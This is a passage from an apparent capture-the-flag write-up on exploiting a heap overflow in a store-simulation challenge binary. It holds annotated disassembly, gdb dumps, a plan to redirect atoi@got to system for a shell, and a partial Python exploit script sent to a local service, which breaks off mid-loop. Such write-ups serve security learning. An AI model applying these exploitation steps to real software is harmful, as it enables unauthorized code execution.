</span><span class='line'><span class="mh">0x8a50c18</span><span class="p">:</span> <span class="mh">0x00414141</span>  <span class="mh">0x7fffffff</span>  <span class="mh">0x00000003</span>  <span class="mh">0x00000081</span>
</span><span class='line'>            <span class="o">.--</span> <span class="n">normal</span> <span class="n">pointer</span>
</span><span class='line'>            <span class="n">v</span>
</span><span class='line'><span class="mh">0x8a50c28</span><span class="p">:</span> <span class="mh">0x08049b70</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8a50c38</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span></code></pre></td></tr></table></div></figure>


<p>I was ready to rock &amp; roll! I dumped in an address of a gadget, hoping to get code execution. There were, however, two small problems. First, the binary takes the pointer stored at the start of the item struct and then derefences it to get a second pointer to a function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">;;;</span> <span class="n">triggered</span> <span class="n">when</span> <span class="n">asking</span> <span class="k">for</span> <span class="n">a</span> <span class="n">wholesale</span> <span class="n">price</span>
</span><span class='line'> <span class="mi">8048</span><span class="n">fdd</span><span class="p">:</span> <span class="n">call</span>   <span class="mi">804897</span><span class="n">b</span> <span class="o">&lt;</span><span class="nb">exit</span><span class="nd">@plt</span><span class="o">+</span><span class="mh">0x1ab</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">this</span> <span class="n">call</span> <span class="n">will</span> <span class="n">be</span> <span class="n">important</span> <span class="ow">in</span> <span class="n">a</span> <span class="n">few</span> <span class="n">moments</span>
</span><span class='line'> <span class="mi">8048</span><span class="n">fe2</span><span class="p">:</span> <span class="n">pop</span>    <span class="n">eax</span>                         <span class="p">;</span>
</span><span class='line'> <span class="mi">8048</span><span class="n">fe3</span><span class="p">:</span> <span class="n">pop</span>    <span class="n">edx</span>                         <span class="p">;</span>
</span><span class='line'> <span class="mi">8048</span><span class="n">fe4</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esi</span><span class="p">]</span>         <span class="p">;</span> <span class="n">esi</span> <span class="ow">is</span> <span class="o">*</span><span class="n">item</span><span class="p">,</span> <span class="n">so</span> <span class="n">this</span> <span class="n">loads</span> <span class="mh">0x08049b70</span> <span class="n">into</span> <span class="n">eax</span>
</span><span class='line'> <span class="mi">8048</span><span class="n">fe6</span><span class="p">:</span> <span class="n">push</span>   <span class="n">edi</span>                         <span class="p">;</span> <span class="nb">input</span> <span class="k">for</span> <span class="n">function</span>
</span><span class='line'> <span class="mi">8048</span><span class="n">fe7</span><span class="p">:</span> <span class="n">push</span>   <span class="n">esi</span>                         <span class="p">;</span>
</span><span class='line'> <span class="mi">8048</span><span class="n">fe8</span><span class="p">:</span> <span class="n">call</span>   <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>             <span class="p">;</span> <span class="n">this</span> <span class="n">derefences</span> <span class="mh">0x08049b70</span><span class="p">,</span> <span class="n">effectively</span> <span class="n">calling</span> <span class="mh">0x08049466</span>
</span></code></pre></td></tr></table></div></figure>


<p>So I needed to have a pointer to a pointer on the heap. I had no way of leaking the heap address yet. I tried to overflow using the address of a got pointer so I could use <code>sprintf</code> to leak further information, but then the function at <code>0x8048fdd</code> reared its ugly head:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'> <span class="p">;;</span> <span class="n">strange</span> <span class="n">function</span><span class="p">,</span> <span class="n">opens</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">zero</span><span class="p">,</span> <span class="n">tries</span> <span class="n">to</span> <span class="n">read</span> <span class="n">one</span> <span class="n">byte</span> <span class="ow">and</span> <span class="n">then</span> <span class="n">closes</span> <span class="n">it</span>
</span><span class='line'> <span class="mi">804897</span><span class="n">b</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebp</span>
</span><span class='line'> <span class="mi">804897</span><span class="n">c</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
</span><span class='line'> <span class="mi">804897</span><span class="n">e</span><span class="p">:</span> <span class="n">push</span>   <span class="n">esi</span>
</span><span class='line'> <span class="mi">804897</span><span class="n">f</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebx</span>
</span><span class='line'> <span class="mi">8048980</span><span class="p">:</span> <span class="n">push</span>   <span class="n">edx</span>
</span><span class='line'> <span class="mi">8048981</span><span class="p">:</span> <span class="n">push</span>   <span class="n">edx</span>
</span><span class='line'> <span class="mi">8048982</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x0</span>
</span><span class='line'> <span class="mi">8048984</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x80495ce</span>                 <span class="p">;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">zero</span>
</span><span class='line'> <span class="mi">8048989</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">esi</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
</span><span class='line'> <span class="mi">804898</span><span class="n">c</span><span class="p">:</span> <span class="n">call</span>   <span class="mi">80486</span><span class="n">d0</span> <span class="o">&lt;</span><span class="nb">open</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'> <span class="mi">8048991</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
</span><span class='line'> <span class="mi">8048994</span><span class="p">:</span> <span class="n">test</span>   <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
</span><span class='line'> <span class="mi">8048996</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span>
</span><span class='line'> <span class="mi">8048998</span><span class="p">:</span> <span class="n">jns</span>    <span class="mi">80489</span><span class="n">a4</span> <span class="o">&lt;</span><span class="nb">exit</span><span class="nd">@plt</span><span class="o">+</span><span class="mh">0x1d4</span><span class="o">&gt;</span>
</span><span class='line'> <span class="mi">804899</span><span class="n">a</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
</span><span class='line'> <span class="mi">804899</span><span class="n">d</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x1</span>
</span><span class='line'> <span class="mi">804899</span><span class="n">f</span><span class="p">:</span> <span class="n">call</span>   <span class="mi">80487</span><span class="n">d0</span> <span class="o">&lt;</span><span class="nb">exit</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">a4</span><span class="p">:</span> <span class="n">push</span>   <span class="n">eax</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">a5</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x1</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">a7</span><span class="p">:</span> <span class="n">push</span>   <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esi</span><span class="p">]</span>           <span class="p">;</span> <span class="n">read</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span><span class="mh">0x8049b70</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">a9</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebx</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">aa</span><span class="p">:</span> <span class="n">call</span>   <span class="mi">8048750</span> <span class="o">&lt;</span><span class="n">read</span><span class="nd">@plt</span><span class="o">&gt;</span>        <span class="p">;</span> <span class="n">read</span> <span class="n">one</span> <span class="n">byte</span> <span class="n">into</span> <span class="n">non</span><span class="o">-</span><span class="n">readable</span> <span class="nb">buffer</span><span class="p">,</span> <span class="n">huh</span><span class="err">?</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">af</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">b2</span><span class="p">:</span> <span class="n">dec</span>    <span class="n">eax</span>                       <span class="p">;</span> <span class="n">eax</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">of</span> <span class="n">course</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">b3</span><span class="p">:</span> <span class="n">je</span>     <span class="mi">804899</span><span class="n">a</span> <span class="o">&lt;</span><span class="nb">exit</span><span class="nd">@plt</span><span class="o">+</span><span class="mh">0x1ca</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="k">if</span> <span class="n">eax</span> <span class="n">was</span> <span class="n">zero</span><span class="p">,</span> <span class="n">the</span> <span class="n">program</span> <span class="n">would</span> <span class="nb">exit</span><span class="p">()</span> <span class="o">--&gt;</span> <span class="n">protection</span> <span class="n">against</span> <span class="n">rwxp</span><span class="err">?</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">b5</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="n">ebx</span>   <span class="p">;</span> <span class="n">ebx</span> <span class="o">=</span> <span class="n">fd</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">b8</span><span class="p">:</span> <span class="n">lea</span>    <span class="n">esp</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">]</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">bb</span><span class="p">:</span> <span class="n">pop</span>    <span class="n">ebx</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">bc</span><span class="p">:</span> <span class="n">pop</span>    <span class="n">esi</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">bd</span><span class="p">:</span> <span class="n">pop</span>    <span class="n">ebp</span>
</span><span class='line'> <span class="mi">80489</span><span class="n">be</span><span class="p">:</span> <span class="n">jmp</span>    <span class="mi">8048790</span> <span class="o">&lt;</span><span class="n">close</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I didn&rsquo;t see it at first, until I overwrote the function pointer in the item struct with a got address. This address is readable and writeable. This function then tries to read a byte from <code>/dev/zero</code> into the function pointer. If it fails, no problem, execution will happily continue. If it succeeds, however, it will immediately halt execution of the binary. I was in trouble!</p>

<p>I could not call imported functions from the got, nor could I just find any old gadget. Because of the dereferencing, the address of the gadget had to be present in the binary in a non-writeable section!</p>

<p>Finally, I turned to a function that was already in the binary, used for watches:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">wx</span> <span class="mh">0x8049b60</span>
</span><span class='line'><span class="mh">0x8049b60</span><span class="p">:</span> <span class="mh">0x0804935e</span>  <span class="mh">0x0804932e</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first function is called when asking for a wholesale price. However, the second function at <code>0x0804932e</code> is used in the generation of the store menu.</p>

<h2>Tricky overflow</h2>

<p>That function at <code>0x0804932e</code> looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'> <span class="mi">804932</span><span class="n">e</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebp</span>
</span><span class='line'> <span class="mi">804932</span><span class="n">f</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
</span><span class='line'> <span class="mi">8049331</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
</span><span class='line'> <span class="mi">8049334</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
</span><span class='line'> <span class="mi">8049337</span><span class="p">:</span> <span class="n">lea</span>    <span class="n">edx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x24</span><span class="p">]</span>
</span><span class='line'> <span class="mi">804933</span><span class="n">a</span><span class="p">:</span> <span class="n">push</span>   <span class="n">edx</span>
</span><span class='line'> <span class="mi">804933</span><span class="n">b</span><span class="p">:</span> <span class="n">lea</span>    <span class="n">edx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>                   <span class="p">;</span> <span class="n">name</span>
</span><span class='line'> <span class="mi">804933</span><span class="n">e</span><span class="p">:</span> <span class="n">push</span>   <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x74</span><span class="p">]</span>            <span class="p">;</span> <span class="n">price</span>
</span><span class='line'> <span class="mi">8049341</span><span class="p">:</span> <span class="n">push</span>   <span class="n">edx</span>                             <span class="p">;</span> <span class="n">description</span>
</span><span class='line'> <span class="mi">8049342</span><span class="p">:</span> <span class="n">imul</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x78</span><span class="p">],</span><span class="mh">0x14</span>   <span class="p">;</span> <span class="nb">type</span> <span class="n">of</span> <span class="n">watch</span>
</span><span class='line'> <span class="mi">8049346</span><span class="p">:</span> <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x804b140</span>
</span><span class='line'> <span class="mi">804934</span><span class="n">b</span><span class="p">:</span> <span class="n">push</span>   <span class="n">eax</span>
</span><span class='line'> <span class="mi">804934</span><span class="n">c</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x80495aa</span>                       <span class="p">;</span> <span class="n">format</span> <span class="n">string</span>
</span><span class='line'> <span class="mi">8049351</span><span class="p">:</span> <span class="n">push</span>   <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>             <span class="p">;</span> <span class="n">char</span> <span class="o">*</span><span class="nb">buffer</span><span class="p">:</span> <span class="n">ATTACKER</span><span class="o">-</span><span class="n">SUPPLIED</span><span class="err">!</span>
</span><span class='line'> <span class="mi">8049354</span><span class="p">:</span> <span class="n">call</span>   <span class="mi">80486</span><span class="n">c0</span> <span class="o">&lt;</span><span class="n">sprintf</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'> <span class="mi">8049359</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x20</span>
</span><span class='line'> <span class="mi">804935</span><span class="n">c</span><span class="p">:</span> <span class="n">leave</span>
</span><span class='line'> <span class="mi">804935</span><span class="n">d</span><span class="p">:</span> <span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>I chose to overwrite the function pointer in the item struct with  with <code>0x8049b64</code>. This causes the program to call <code>0x804932e</code> instead of the &lsquo;get wholesale price&rsquo;-function <strong>with an attacker supplied argument</strong>. This will allow me to overwrite a piece of memory with the generated string. If I set the description or name of an item correctly and I applied a correct offset, I could overwrite anything I want. There was some collateral damage to surrounding memory, however, making it impossible to overwrite a got pointer directly. The program contains another puzzle piece and I wanted to gain control over that instead.</p>

<h2>Going for the big bucks</h2>

<p>On the heap was an integer (or DWORD) that holds the amount of money that the simulated store customer has. The program substracts from this amount when a purchase is done, making it potentially a write-primitive. The <em>pointer</em> to this heap address lives at <code>0x804b280</code>. I wanted to overwrite this pointer with the address of <code>atoi@got</code>. Then, I would be able to update the pointer at <code>atoi@got</code>. Why <code>atoi</code>? Because it also uses one argument, just like <code>system</code>. If I could make <code>atoi</code> point to <code>system</code>, I had an easy way of spawning a shell. I modified the poc to do this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">6666</span><span class="p">))</span>
</span><span class='line'>  <span class="c">#s.connect((&#39;146.148.60.107&#39;, 6666))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># pause to allow gdb to attach</span>
</span><span class='line'>  <span class="nb">raw_input</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># register store</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;store?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># store name; maximum allowed, need it to overflow a buffer later!</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;S&quot;</span><span class="o">*</span><span class="mi">63</span><span class="p">)</span> 
</span><span class='line'>  
</span><span class='line'>  <span class="c"># the program *needs* to have an item to sell before it can generate a store menu</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># generate store menu. this will be 0xb20 bytes large, on the heap. </span>
</span><span class='line'>  <span class="c"># overflow such that the store description will overwrite the second item&#39;s function pointer</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># second item</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xf</span><span class="p">)</span> <span class="c"># this will make the price of this item 0x7fffffff, ready to be abused later</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># use this later to overwrite the ptr to the money DWORD</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804b038</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x4f</span><span class="o">-</span><span class="mi">5</span><span class="p">))</span> <span class="c"># 0x804b038 = atoi@got</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># allocate the rest of the items</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">13</span><span class="p">):</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
